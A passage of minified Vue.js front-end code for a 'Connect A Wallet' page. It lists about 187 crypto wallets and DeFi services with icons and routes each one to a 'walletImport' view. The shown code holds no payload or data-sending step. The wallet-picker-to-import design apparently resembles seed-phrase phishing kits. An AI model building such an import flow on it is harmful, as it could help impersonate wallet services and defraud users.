                icon: "Torus.jpeg",
                heading: "Torus",
                link: "https://toruswallet.io/",
            },
            {
                id: 36,
                icon: "Spatium.jpeg",
                heading: "Spatium",
                link: "https://spatium.net/",
            },
            {
                id: 37,
                icon: "safePal.jpeg",
                heading: "SafePal",
                link: "https://safepal.io/",
            },
            {
                id: 38,
                icon: "Infinito.jpeg",
                heading: "Infinito",
                link: "https://infinitowallet.io/",
            },
            {
                id: 39,
                icon: "Walletio.jpeg",
                heading: "wallet.io",
                link: "https://wallet.io/",
            },
            {
                id: 40,
                icon: "InfinityWallet.jpeg",
                heading: "infinity wallet",
                link: "https://infinitywallet.io/",
            },
            {
                id: 41,
                icon: "Ownbit.jpeg",
                heading: "Ownbit",
                link: "https://ownbit.io",
            },
            {
                id: 42,
                icon: "EasyPocket.jpeg",
                heading: "EasyPocket",
                link: "https://easypocket.app/",
            },
            {
                id: 43,
                icon: "BridgeWallet.jpeg",
                heading: "Bridge Wallet",
                link: "https://mtpelerin.com/bridge-wallet",
            },
            {
                id: 44,
                icon: "SparkPoint.jpeg",
                heading: "SparkPoint",
                link: "https://sparkpoint.io/",
            },
            {
                id: 45,
                icon: "ViaWallet.jpeg",
                heading: "ViaWallet",
                link: "https://viawallet.com/",
            },
            {
                id: 46,
                icon: "BitKeep.jpeg",
                heading: "BitKeep",
                link: "https://bitkeep.com/",
            },
            {
                id: 47,
                icon: "Vision.jpeg",
                heading: "Vision",
                link: "https://vision-crypto.com/",
            },
            {
                id: 48,
                icon: "PEAKDEFIWallet.jpeg",
                heading: "PEAKDEFI Wallet",
                link: "https://peakdefi.com/",
            },
            {
                id: 49,
                icon: "UnstoppableWallet.jpeg",
                heading: "Unstoppable Wallet",
                link: "https://unstoppable.money/",
            },
            {
                id: 50,
                icon: "HaloDeFiWallet.jpeg",
                heading: "HaloDeFi Wallet",
                link: "https://halodefi.org/",
            },
            {
                id: 51,
                icon: "DokWallet.jpeg",
                heading: "Dok Wallet",
                link: "https://dokwallet.com/",
            },
            {
                id: 52,
                icon: "ATWallet.jpeg",
                heading: "AT. Wallet",
                link: "https://authentrend.com/at-wallet",
            },
            {
                id: 53,
                icon: "MidasWallet.jpeg",
                heading: "Midas Wallet",
                link: "https://midasprotocol.io/",
            },
            {
                id: 54,
                icon: "Ellipal.jpeg",
                heading: "Ellipal",
                link: "https://ellipal.com/",
            },
            {
                id: 55,
                icon: "KEYRINGPRO.jpeg",
                heading: "KEYRING PRO",
                link: "https://keyring.app/",
            },
            {
                id: 56,
                icon: "Aktionariat.jpeg",
                heading: "Aktionariat",
                link: "https://aktionariat.com/",
            },
            {
                id: 57,
                icon: "TalkenWallet.jpeg",
                heading: "Talken Wallet",
                link: "https://talken.io/",
            },
            {
                id: 58,
                icon: "XinFinXDCNetwork.jpeg",
                heading: "XinFin XDC Network",
                link: "https://www.xinfin.io/",
            },
            {
                id: 59,
                icon: "FlareWallet.jpeg",
                heading: "Flare Wallet",
                link: "https://flarewallet.io/",
            },
            {
                id: 60,
                icon: "KyberSwap.jpeg",
                heading: "KyberSwap",
                link: "https://kyberswap.com/",
            },
            {
                id: 61,
                icon: "ATokenWallet.jpeg",
                heading: "AToken Wallet",
                link: "https://atoken.com/",
            },
            {
                id: 62,
                icon: "TongueWallet.jpeg",
                heading: "Tongue Wallet",
                link: "https://www.tongue.fi/",
            },
            {
                id: 63,
                icon: "RWallet.jpeg",
                heading: "RWallet",
                link: "https://rsk.co/",
            },
            {
                id: 64,
                icon: "coin.png",
                heading: "Coinbase",
                link: "http://coinbasewallet.com/",
            },
            {
                id: 65,
                icon: "PlasmaPay.jpeg",
                heading: "PlasmaPay",
                link: "https://plasmapay.com/",
            },
            {
                id: 66,
                icon: "O3wallet.jpeg",
                heading: "O3wallet",
                link: "https://o3.network/",
            },
            {
                id: 67,
                icon: "haskkey.jpeg",
                heading: "HashKey Me",
                link: "https://me.hashkey.com/",
            },
            {
                id: 68,
                icon: "JadeWallet.jpeg",
                heading: "Jade Wallet",
                link: "https://jadewallet.io/",
            },
            {
                id: 69,
                icon: "Guarda.jpeg",
                heading: "Guarda Wallet",
                link: "https://guarda.com/",
            },
            {
                id: 70,
                icon: "Defiant.jpeg",
                heading: "Defiant",
                link: "https://defiantapp.tech/",
            },
            {
                id: 71,
                icon: "Trustee.jpeg",
                heading: "Trustee Wallet",
                link: "https://trusteeglobal.com/",
            },
            {
                id: 72,
                icon: "equal.jpeg",
                heading: "Equal",
                link: "https://equal.tech/",
            },
            {
                id: 73,
                icon: "meetone.jpeg",
                heading: "MEET.ONE",
                link: "https://www.meet.one/",
            },
            {
                id: 74,
                icon: "morix.jpeg",
                heading: "Morix Wallet",
                link: "https://morixjp.com/eng/products/walletcard",
            },
            {
                id: 75,
                icon: "binance.jpg",
                heading: "Binance Smart Chain",
                link: "https://www.binance.org/en/smartChain",
            },
            {
                id: 76,
                icon: "1ce6dae0fea7114844.jpeg",
                heading: "Safepal Wallet",
                link: "https://safepal.io/",
            },
            {
                id: 77,
                icon: "safemoon.png",
                heading: "Safemoon Wallet",
                link: "https://safemoon.net/",
            },
            {
                id: 78,
                icon: "saitama.jpeg",
                heading: "SaitamaMask Wallet",
                link: "https://saitamatoken.com/",
            },
            {
                id: 79,
                icon: "walletconnect.png",
                heading: "Wallet Connect",
                link: "https://walletconnect.com/",
            },
            {
                id: 80,
                icon: "phantom.jpg",
                heading: "Phantom",
                link: "https://phantom.app/",
            },
            ]);
            return (a, o) => (
                s(),
                r("main", Be, [
                    e("section", Ve, [
                        ze,
                        e("div", Fe, [
                            e("div", He, [
                                e("div", Le, [
                                    Ke,
                                    Re,
                                    p(
                                        u(x), {
                                        to: {
                                            name: "wallet"
                                        },
                                        class: "bg-gray-200 py-2 px-3 mt-7 mb-8 rounded-md text-sky-800 font-semibold border-2 border-sky-400 hover:shadow-md hover:bg-gray-100 hover:border-sky-200 hover:text-sky-500",
                                    }, {
                                        default: h(() => [Ge]),
                                        _: 1
                                    }
                                    ),
                                ]),
                                Xe,
                                Ue,
                            ]),
                        ]),
                    ]),
                    Ye,
                    e("section", Ze, [
                        Je,
                        e("div", qe, [
                            (s(!0),
                                r(
                                    j,
                                    null,
                                    N(
                                        l.value,
                                        (t) => (
                                            s(),
                                            r("div", {
                                                key: t.id,
                                                class: "mt-6 mb-7 group"
                                            }, [
                                                e(
                                                    "a", {
                                                    class: "flex flex-col gap-1 items-center",
                                                    href: `${t.link}`,
                                                    target: "_blank",
                                                    rel: "noopener noreferrer",
                                                }, [
                                                    e(
                                                        "img", {
                                                        class: "w-[100px] h-[100px] rounded-full bg-white group-hover:shadow-md",
                                                        src: `icons/${t.icon}`,
                                                        alt: `${t.heading}`,
                                                    },
                                                        null,
                                                        8,
                                                        et
                                                    ),
                                                    e("h3", tt, f(t.heading), 1),
                                                ],
                                                    8,
                                                    Qe
                                                ),
                                            ])
                                        )
                                    ),
                                    128
                                )),
                        ]),
                    ]),
                    e("section", at, [
                        e("div", lt, [
                            ot,
                            p(
                                u(x), {
                                to: {
                                    name: "wallet"
                                },
                                class: "border-4 mb-4 font-bold text-center lg:text-base w-fit px-8 py-3 hover:border-sky-400 hover:text-gray-100",
                            }, {
                                default: h(() => [nt]),
                                _: 1
                            }
                            ),
                        ]),
                    ]),
                ])
            );
        },
    };
var st = v(it, [
    ["__scopeId", "data-v-7b35ba54"]
]);
const rt = {
    class: "min-h-screen bg-gray-100"
},
    dt = {
        class: "max-w-7xl mx-auto px-4 py-3"
    },
    ct = e(
        "div", {
        class: "flex flex-col gap-3 items-center justify-center"
    }, [
        e(
            "h1", {
            class: "text-center font-bold text-2xl pt-7 text-gray-800 pb-1 lg:text-5xl lg:pt-10",
        },
            "Connect A Wallet"
        ),
        e(
            "p", {
            class: "text-center lg:text-base text-gray-700 text-sm"
        },
            "Select a wallet to continue"
        ),
    ], -1
    ),
    pt = {
        class: "grid grid-cols-2 lg:grid-cols-3 gap-4 justify-items-center mt-24",
    },
    gt = ["src", "alt"],
    ht = {
        class: "mt-5 font-bold text-sky-600 text-base lg:text-lg group-hover:text-sky-800 text-center py-4",
    },
    wt = {
        class: "text-indigo-800"
    },
    mt = e(
        "div", {
        class: "flex items-center justify-center pt-10 mt-6"
    }, [
        e(
            "p", {
            class: "text-center text-gray-700"
        },
            "Open an app submission issue on Github to add your app here."
        ),
    ], -1
    ),
    ut = {
        setup(n) {
            const l = d([{
                id: 1,
                walletName: "Binance Smart Chain",
                walletIcon: "binance.jpg"
            },
            {
                id: 2,
                walletName: "WalletConnect",
                walletIcon: "walletconnect.png"
            },
            {
                id: 3,
                walletName: "Rainbow",
                walletIcon: "rainbow.jpeg"
            },
            {
                id: 4,
                walletName: "Trust Wallet",
                walletIcon: "trustwallet.jpeg"
            },
            {
                id: 5,
                walletName: "Phantom",
                walletIcon: "phantom.jpg"
            },
            {
                id: 6,
                walletName: "MetaMask",
                walletIcon: "MetaMask.jpeg"
            },
            {
                id: 7,
                walletName: "Gnosis Safe Multisig",
                walletIcon: "GnosisSafeMultisig.jpeg",
            },
            {
                id: 8,
                walletName: "Crypto.com | DeFi Wallet",
                walletIcon: "Cryptocom.jpeg",
            },
            {
                id: 10,
                walletName: "Pillar",
                walletIcon: "Pillar.jpeg"
            },
            {
                id: 11,
                walletName: "imToken",
                walletIcon: "imToken.jpeg"
            },
            {
                id: 12,
                walletName: "ONTO",
                walletIcon: "ONTO.jpeg"
            },
            {
                id: 13,
                walletName: "velas",
                walletIcon: "velas.png"
            },
            {
                id: 14,
                walletName: "yoroi",
                walletIcon: "yoroi.png"
            },
            {
                id: 15,
                walletName: "crypto.com",
                walletIcon: "crypto.png"
            },
            {
                id: 16,
                walletName: "Coinbase",
                walletIcon: "coin.png"
            },
            {
                id: 17,
                walletName: "vechain",
                walletIcon: "vechain.png"
            },
            {
                id: 18,
                walletName: "Tronlink",
                walletIcon: "tron.png"
            },
            {
                id: 19,
                walletName: "Safemoon",
                walletIcon: "safemoon.png"
            },
            {
                id: 20,
                walletName: "Safepal",
                walletIcon: "SafePal.jpeg"
            },
            {
                id: 21,
                walletName: "TokenPocket",
                walletIcon: "tokenpocket.jpeg"
            },
            {
                id: 22,
                walletName: "MathWallet",
                walletIcon: "MathWallet.jpeg"
            },
            {
                id: 23,
                walletName: "BitPay",
                walletIcon: "bitpay.jpeg"
            },
            {
                id: 24,
                walletName: "Ledger Live",
                walletIcon: "LedgerLive.jpeg"
            },
            {
                id: 25,
                walletName: "Walleth",
                walletIcon: "Walleth.jpeg"
            },
            {
                id: 26,
                walletName: "Authereum",
                walletIcon: "Authereum.jpeg"
            },
            {
                id: 27,
                walletName: "Dharma",
                walletIcon: "dharma.jpeg"
            },
            {
                id: 28,
                walletName: "1inch Wallet",
                walletIcon: "1inchWallet.jpeg"
            },
            {
                id: 29,
                walletName: "Huobi Wallet",
                walletIcon: "HuobiWallet.jpeg"
            },
            {
                id: 30,
                walletName: "Eidoo",
                walletIcon: "Eidoo.jpeg"
            },
            {
                id: 31,
                walletName: "Etherscan",
                walletIcon: "Etherscan.jpeg"
            },
            {
                id: 32,
                walletName: "Uniswap",
                walletIcon: "Uniswap.jpeg"
            },
            {
                id: 33,
                walletName: "Binance DEX",
                walletIcon: "BinanceDEX.jpeg"
            },
            {
                id: 34,
                walletName: "OpenSea",
                walletIcon: "OpenSea.jpeg"
            },
            {
                id: 35,
                walletName: "Compound",
                walletIcon: "Compound.jpeg"
            },
            {
                id: 36,
                walletName: "Zapper",
                walletIcon: "zapper.jpeg"
            },
            {
                id: 37,
                walletName: "Aave",
                walletIcon: "Aave.jpeg"
            },
            {
                id: 38,
                walletName: "Zerion",
                walletIcon: "Zerion.jpeg"
            },
            {
                id: 39,
                walletName: "LocalCryptos",
                walletIcon: "LocalCryptos.jpeg"
            },
            {
                id: 40,
                walletName: "DeBank",
                walletIcon: "DeBank.jpeg"
            },
            {
                id: 41,
                walletName: "Unstoppable Domains",
                walletIcon: "UnstoppableDomains.jpeg",
            },
            {
                id: 42,
                walletName: "Rarible",
                walletIcon: "Rarible.jpeg"
            },
            {
                id: 43,
                walletName: "1inch Exchange",
                walletIcon: "1inchExchange.jpeg",
            },
            {
                id: 44,
                walletName: "yearn",
                walletIcon: "yearn.jpeg"
            },
            {
                id: 45,
                walletName: "Nash",
                walletIcon: "Nash.jpeg"
            },
            {
                id: 46,
                walletName: "Curve",
                walletIcon: "Curve.jpeg"
            },
            {
                id: 47,
                walletName: "Adex Network",
                walletIcon: "AdexNetwork.jpeg"
            },
            {
                id: 48,
                walletName: "dYdX",
                walletIcon: "dYdX.jpeg"
            },
            {
                id: 49,
                walletName: "MyCrypto",
                walletIcon: "MyCrypto.jpeg"
            },
            {
                id: 50,
                walletName: "MYKEY",
                walletIcon: "MYKEY.jpeg"
            },
            {
                id: 51,
                walletName: "Loopring",
                walletIcon: "Loopring.jpeg"
            },
            {
                id: 52,
                walletName: "Ankr",
                walletIcon: "Ankr.jpeg"
            },
            {
                id: 53,
                walletName: "TrustVault",
                walletIcon: "TrustVault.jpeg"
            },
            {
                id: 54,
                walletName: "Atomic",
                walletIcon: "Atomic.jpeg"
            },
            {
                id: 55,
                walletName: "Coin98",
                walletIcon: "Coin98.jpeg"
            },
            {
                id: 56,
                walletName: "CoolWallet S",
                walletIcon: "CoolWalletS.jpeg"
            },
            {
                id: 57,
                walletName: "Alice",
                walletIcon: "Alice.jpeg"
            },
            {
                id: 58,
                walletName: "AlphaWallet",
                walletIcon: "AlphaWallet.jpeg"
            },
            {
                id: 59,
                walletName: "D'CENT Wallet",
                walletIcon: "DCENTWallet.jpeg"
            },
            {
                id: 60,
                walletName: "ZelCore",
                walletIcon: "ZelCore.jpeg"
            },
            {
                id: 61,
                walletName: "Coinomi",
                walletIcon: "Coinomi.jpeg"
            },
            {
                id: 62,
                walletName: "GridPlus",
                walletIcon: "GridPlus.jpeg"
            },
            {
                id: 63,
                walletName: "CYBAVO Wallet",
                walletIcon: "CYBAVO.jpeg"
            },
            {
                id: 64,
                walletName: "Tokenary",
                walletIcon: "Tokenary.jpeg"
            },
            {
                id: 65,
                walletName: "Torus",
                walletIcon: "Torus.jpeg"
            },
            {
                id: 66,
                walletName: "Spatium",
                walletIcon: "Spatium.jpeg"
            },
            {
                id: 67,
                walletName: "SafePal",
                walletIcon: "SafePal.jpeg"
            },
            {
                id: 68,
                walletName: "Infinito",
                walletIcon: "Infinito.jpeg"
            },
            {
                id: 69,
                walletName: "wallet.io",
                walletIcon: "Walletio.jpeg"
            },
            {
                id: 70,
                walletName: "Infinity Wallet",
                walletIcon: "InfinityWallet.jpeg",
            },
            {
                id: 71,
                walletName: "Ownbit",
                walletIcon: "Ownbit.jpeg"
            },
            {
                id: 72,
                walletName: "EasyPocket",
                walletIcon: "EasyPocket.jpeg"
            },
            {
                id: 73,
                walletName: "Polkadot",
                walletIcon: "polkadot.webp"
            },
            {
                id: 74,
                walletName: "Bridge Wallet",
                walletIcon: "BridgeWallet.jpeg",
            },
            {
                id: 75,
                walletName: "SparkPoint",
                walletIcon: "SparkPoint.jpeg"
            },
            {
                id: 76,
                walletName: "ViaWallet",
                walletIcon: "ViaWallet.jpeg"
            },
            {
                id: 77,
                walletName: "BitKeep",
                walletIcon: "BitKeep.jpeg"
            },
            {
                id: 78,
                walletName: "Vision",
                walletIcon: "Vision.jpeg"
            },
            {
                id: 79,
                walletName: "PEAKDEFIWallet",
                walletIcon: "PEAKDEFIWallet.jpeg",
            },
            {
                id: 80,
                walletName: "Unstoppable Wallet",
                walletIcon: "UnstoppableWallet.jpeg",
            },
            {
                id: 81,
                walletName: "HaloDeFi Wallet",
                walletIcon: "HaloDeFiWallet.jpeg",
            },
            {
                id: 82,
                walletName: "Dok Wallet",
                walletIcon: "DokWallet.jpeg"
            },
            {
                id: 83,
                walletName: "AT.Wallet",
                walletIcon: "ATWallet.jpeg"
            },
            {
                id: 85,
                walletName: "Midas Wallet",
                walletIcon: "MidasWallet.jpeg"
            },
            {
                id: 86,
                walletName: "Ellipal",
                walletIcon: "Ellipal.jpeg"
            },
            {
                id: 87,
                walletName: "KEYRING PRO",
                walletIcon: "KEYRINGPRO.jpeg"
            },
            {
                id: 88,
                walletName: "Aktionariat",
                walletIcon: "Aktionariat.jpeg"
            },
            {
                id: 89,
                walletName: "Talken Wallet",
                walletIcon: "TalkenWallet.jpeg",
            },
            {
                id: 90,
                walletName: "XinFin XDC Network",
                walletIcon: "XinFinXDCNetwork.jpeg",
            },
            {
                id: 91,
                walletName: "Flare Wallet",
                walletIcon: "FlareWallet.jpeg"
            },
            {
                id: 92,
                walletName: "KyberSwap",
                walletIcon: "KyberSwap.jpeg"
            },
            {
                id: 93,
                walletName: "AToken Wallet",
                walletIcon: "ATokenWallet.jpeg",
            },
            {
                id: 94,
                walletName: "Tongue Wallet",
                walletIcon: "TongueWallet.jpeg",
            },
            {
                id: 95,
                walletName: "RWallet",
                walletIcon: "RWallet.jpeg"
            },
            {
                id: 96,
                walletName: "PlasmaPay",
                walletIcon: "PlasmaPay.jpeg"
            },
            {
                id: 97,
                walletName: "O3wallet",
                walletIcon: "O3wallet.jpeg"
            },
            {
                id: 98,
                walletName: "HashKey Me",
                walletIcon: "HashKeyMe.jpeg"
            },
            {
                id: 99,
                walletName: "Jade Wallet",
                walletIcon: "JadeWallet.jpeg"
            },
            {
                id: 100,
                walletName: "Guarda Wallet",
                walletIcon: "Guarda.jpeg"
            },
            {
                id: 101,
                walletName: "Defiant",
                walletIcon: "Defiant.jpeg"
            },
            {
                id: 102,
                walletName: "Trustee Wallet",
                walletIcon: "TrusteeWallet.jpeg",
            },
            {
                id: 103,
                walletName: "Oasis App",
                walletIcon: "OasisApp.jpeg"
            },
            {
                id: 104,
                walletName: "TokenSets",
                walletIcon: "TokenSets.jpeg"
            },
            {
                id: 105,
                walletName: "MANTRA DAO",
                walletIcon: "MANTRADAO.jpeg"
            },
            {
                id: 106,
                walletName: "Matcha",
                walletIcon: "Matcha.jpeg"
            },
            {
                id: 107,
                walletName: "DeFiPrime",
                walletIcon: "DeFiPrime.jpeg"
            },
            {
                id: 108,
                walletName: "InstaDapp",
                walletIcon: "InstaDapp.jpeg"
            },
            {
                id: 109,
                walletName: "Matic Network",
                walletIcon: "MaticNetwork.jpeg",
            },
            {
                id: 110,
                walletName: "3Box",
                walletIcon: "3Box.jpeg"
            },
            {
                id: 111,
                walletName: "DDEX",
                walletIcon: "DDEX.jpeg"
            },
            {
                id: 112,
                walletName: "Totle",
                walletIcon: "Totle.jpeg"
            },
            {
                id: 113,
                walletName: "Bamboo Relay",
                walletIcon: "BambooRelay.jpeg"
            },
            {
                id: 114,
                walletName: "Synthetix",
                walletIcon: "Synthetix.jpeg"
            },
            {
                id: 115,
                walletName: "dex.blue",
                walletIcon: "dexblue.jpeg"
            },
            {
                id: 116,
                walletName: "PoolTogether",
                walletIcon: "PoolTogether.jpeg",
            },
            {
                id: 117,
                walletName: "Sablier",
                walletIcon: "Sablier.jpeg"
            },
            {
                id: 118,
                walletName: "DEXAG",
                walletIcon: "DEXAG.jpeg"
            },
            {
                id: 119,
                walletName: "ENS Domians",
                walletIcon: "ENSDomians.jpeg"
            },
            {
                id: 120,
                walletName: "Idle Finance",
                walletIcon: "IdleFinance.jpeg"
            },
            {
                id: 121,
                walletName: "iearn.finance",
                walletIcon: "iearnfinance.jpeg",
            },
            {
                id: 122,
                walletName: "RCN Finance",
                walletIcon: "RCNFinance.jpeg"
            },
            {
                id: 123,
                walletName: "Hegic",
                walletIcon: "Hegic.jpeg"
            },
            {
                id: 124,
                walletName: "Kickback",
                walletIcon: "Kickback.jpeg"
            },
            {
                id: 125,
                walletName: "88mph",
                walletIcon: "88mph.jpeg"
            },
            {
                id: 126,
                walletName: "Mooni",
                walletIcon: "Mooni.jpeg"
            },
            {
                id: 127,
                walletName: "Clovers",
                walletIcon: "Clovers.jpeg"
            },
            {
                id: 128,
                walletName: "Mintbase",
                walletIcon: "Mintbase.jpeg"
            },
            {
                id: 129,
                walletName: "DAOstack",
                walletIcon: "DAOstack.jpeg"
            },
            {
                id: 130,
                walletName: "KnownOrigin",
                walletIcon: "KnownOrigin.jpeg"
            },
            {
                id: 131,
                walletName: "MyEtherWallet",
                walletIcon: "MyEtherWallet.jpeg",
            },
            {
                id: 132,
                walletName: "Affogato",
                walletIcon: "Affogato.jpeg"
            },
            {
                id: 133,
                walletName: "StablePay",
                walletIcon: "StablePay.jpeg"
            },
            {
                id: 134,
                walletName: "DeFi Saver",
                walletIcon: "DeFiSaver.jpeg"
            },
            {
                id: 135,
                walletName: "ThorChain",
                walletIcon: "ThorChain.jpeg"
            },
            {
                id: 136,
                walletName: "BulkSender",
                walletIcon: "BulkSender.jpeg"
            },
            {
                id: 137,
                walletName: "Betoken",
                walletIcon: "Betoken.jpeg"
            },
            {
                id: 138,
                walletName: "Linkdrop",
                walletIcon: "Linkdrop.jpeg"
            },
            {
                id: 139,
                walletName: "HelioWallet",
                walletIcon: "HelioWallet.jpeg"
            },
            {
                id: 140,
                walletName: "Escaroo",
                walletIcon: "Escaroo.jpeg"
            },
            {
                id: 141,
                walletName: "TokenMarket",
                walletIcon: "TokenMarket.jpeg"
            },
            {
                id: 142,
                walletName: "Mesa",
                walletIcon: "Mesa.jpeg"
            },
            {
                id: 143,
                walletName: "MCDEX",
                walletIcon: "MCDEX.jpeg"
            },
            {
                id: 144,
                walletName: "Furucombo",
                walletIcon: "Furucombo.jpeg"
            },
            {
                id: 145,
                walletName: "Melon",
                walletIcon: "Melon.jpeg"
            },
            {
                id: 146,
                walletName: "Chainsfr",
                walletIcon: "Chainsfr.jpeg"
            },
            {
                id: 147,
                walletName: "AKA3 Email Alias",
                walletIcon: "AKA3EmailAlias.jpeg",
            },
            {
                id: 148,
                walletName: "2key",
                walletIcon: "2key.jpeg"
            },
            {
                id: 149,
                walletName: "Pitch",
                walletIcon: "Pitch.jpeg"
            },
            {
                id: 150,
                walletName: "SushiSwap",
                walletIcon: "SushiSwap.jpeg"
            },
            {
                id: 151,
                walletName: "Unagii",
                walletIcon: "Unagii.jpeg"
            },
            {
                id: 152,
                walletName: "Cream Finance",
                walletIcon: "CreamFinance.jpeg",
            },
            {
                id: 153,
                walletName: "zkSync",
                walletIcon: "zkSync.jpeg"
            },
            {
                id: 154,
                walletName: "Shell Exchange",
                walletIcon: "ShellExchange.jpeg",
            },
            {
                id: 155,
                walletName: "Index Coop",
                walletIcon: "IndexCoop.jpeg"
            },
            {
                id: 156,
                walletName: "SwapX",
                walletIcon: "SwapX.jpeg"
            },
            {
                id: 157,
                walletName: "Starname",
                walletIcon: "Starname.jpeg"
            },
            {
                id: 158,
                walletName: "Space",
                walletIcon: "Space.jpeg"
            },
            {
                id: 159,
                walletName: "Maskbook",
                walletIcon: "Maskbook.jpeg"
            },
            {
                id: 160,
                walletName: "Snapshot",
                walletIcon: "Snapshot.jpeg"
            },
            {
                id: 161,
                walletName: "Invoice.build",
                walletIcon: "Invoicebuild.jpeg",
            },
            {
                id: 162,
                walletName: "DODO",
                walletIcon: "DODO.jpeg"
            },
            {
                id: 163,
                walletName: "zLOT",
                walletIcon: "zLOT.jpeg"
            },
            {
                id: 164,
                walletName: "TokamakNetwork",
                walletIcon: "TokamakNetwork.jpeg",
            },
            {
                id: 165,
                walletName: "ActusProtocol",
                walletIcon: "ActusProtocol.jpeg",
            },
            {
                id: 166,
                walletName: "AstroTools.io",
                walletIcon: "AstroToolsio.jpeg",
            },
            {
                id: 167,
                walletName: "Rubic Exchange",
                walletIcon: "RubicExchange.jpeg",
            },
            {
                id: 168,
                walletName: "Harvest Finance",
                walletIcon: "HarvestFinance.jpeg",
            },
            {
                id: 169,
                walletName: "OctoFi",
                walletIcon: "OctoFi.jpeg"
            },
            {
                id: 170,
                walletName: "Mushroom Finance",
                walletIcon: "MushroomFinance.jpeg",
            },
            {
                id: 171,
                walletName: "Bifrost Finance",
                walletIcon: "BifrostFinance.jpeg",
            },
            {
                id: 172,
                walletName: "Orchid Protocol",
                walletIcon: "OrchidProtocol.jpeg",
            },
            {
                id: 173,
                walletName: "Lido",
                walletIcon: "Lido.jpeg"
            },
            {
                id: 174,
                walletName: "Datamine Network",
                walletIcon: "DatamineNetwork.jpeg",
            },
            {
                id: 175,
                walletName: "Streamr",
                walletIcon: "Streamr.jpeg"
            },
            {
                id: 176,
                walletName: "DappRadar",
                walletIcon: "DappRadar.jpeg"
            },
            {
                id: 177,
                walletName: "SuperRare",
                walletIcon: "SuperRare.jpeg"
            },
            {
                id: 178,
                walletName: "Arbitrum",
                walletIcon: "Arbitrum.jpeg"
            },
            {
                id: 179,
                walletName: "ParaSwap",
                walletIcon: "ParaSwap.jpeg"
            },
            {
                id: 180,
                walletName: "HoneySwap",
                walletIcon: "HoneySwap.jpeg"
            },
            {
                id: 181,
                walletName: "Fleek",
                walletIcon: "Fleek.jpeg"
            },
            {
                id: 182,
                walletName: "Definer",
                walletIcon: "Definer.jpeg"
            },
            {
                id: 183,
                walletName: "Proof of Humanity",
                walletIcon: "ProofofHumanity.jpeg",
            },
            {
                id: 184,
                walletName: "Livepeer Explorer",
                walletIcon: "LivepeerExplorer.jpeg",
            },
            {
                id: 185,
                walletName: "Swapzone",
                walletIcon: "Swapzone.jpeg"
            },
            {
                id: 186,
                walletName: "Nami Wallet",
                walletIcon: "namiwallet.svg"
            },
            {
                id: 187,
                walletName: "Klever",
                walletIcon: "klever-ex.png"
            }
            ]);
            return (
                d(""),
                (a, o) => (
                    s(),
                    r("div", rt, [
                        e("section", dt, [
                            ct,
                            e("div", pt, [
                                (s(!0),
                                    r(
                                        j,
                                        null,
                                        N(
                                            l.value,
                                            (t, i) => (
                                                s(),
                                                r("div", {
                                                    key: i
                                                }, [
                                                    p(
                                                        u(x), {
                                                        to: {
                                                            name: "walletImport",
                                                            params: {
                                                                id: i,
                                                                name: t.walletName
                                                            },
                                                        },
                                                        class: "flex flex-col items-center group",
                                                    }, {
                                                        default: h(() => [
                                                            e(
                                                                "img", {
                                                                class: "rounded-full h-[90px] w-[90px] lg:w-[140px] lg:h-[140px] object-contain group-hover:shadow-2xl transition-all duration-500 ease-in-out",
                                                                src: `../icons/${t.walletIcon}`,
                                                                alt: t.walletName,
                                                            },
                                                                null,
                                                                8,
                                                                gt
                                                            ),
                                                            e("p", ht, [e("span", wt, f(t.walletName), 1)]),
                                                        ]),
                                                        _: 2,
                                                    },
                                                        1032, ["to"]
                                                    ),
                                                ])
                                            )
                                        ),
                                        128
                                    )),
                            ]),
                            mt,
                        ]),
                    ])
                )
            );
        },
    },
    xt = {
        props: ["title"],
        setup() {
            return {
                selcTitle: U("selcTitle")
            };
        },
    };

function ft(n, l, a, o, t, i) {
    return _((s(), r("div", null, [B(n.$slots, "default")], 512)), [
        [O, a.title == o.selcTitle],
    ]);
}
var T = v(xt, [
    ["render", ft]
]);
const yt = {
    setup(n, {
        slots: l
    }) {
        const a = d(l.default().map((t) => t.props.title)),
            o = d(a.value[0]);
        return Z("selcTitle", o), {
            tabTitles: a,
            selcTitle: o
        };
    },
},
    vt = {
        class: "tabs"
    },
    bt = {
        class: "tab__header flex flex-wrap -mb-px"
    },
    kt = ["onClick"],
    _t = {
        class: "inline-block py-2 px-2 text-sm lg:text-base lg:px-5 lg:font-bold font-medium text-center shadow-md",
    };

function jt(n, l, a, o, t, i) {
    return (
        s(),
        r(
            j,
            null, [
            e("div", vt, [
                e("ul", bt, [
                    (s(!0),
                        r(
                            j,
                            null,
                            N(
                                o.tabTitles,
                                (c) => (
                                    s(),
                                    r(
                                        "li", {
                                        key: c,
                                        onClick: (w) => (o.selcTitle = c),
                                        class: Y([
                                            "mr-2 cursor-pointer",
                                            {
                                                "text-sky-800": c == o.selcTitle
                                            },
                                        ]),
                                    }, [e("span", _t, f(c), 1)],
                                        10,
                                        kt
                                    )
                                )
                            ),
                            128
                        )),
                ]),
            ]),
            B(n.$slots, "default"),
        ],
            64
        )
    );
}
var Nt = v(yt, [
    ["render", jt]
]);
const It = {},
    Ct = {
        class: "fixed bg-white/75 inset-0 flex items-center justify-center"
    },
    Wt = e(
        "svg", {
        role: "status",
        class: "mr-2 w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600",
        viewBox: "0 0 100 101",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg",
    }, [
        e("path", {
            d: "M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z",
            fill: "currentColor",
        }),
        e("path", {
            d: "M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z",
            fill: "currentFill",
        }),
    ], -1
    ),
    $t = [Wt];

function St(n, l, a, o, t, i) {
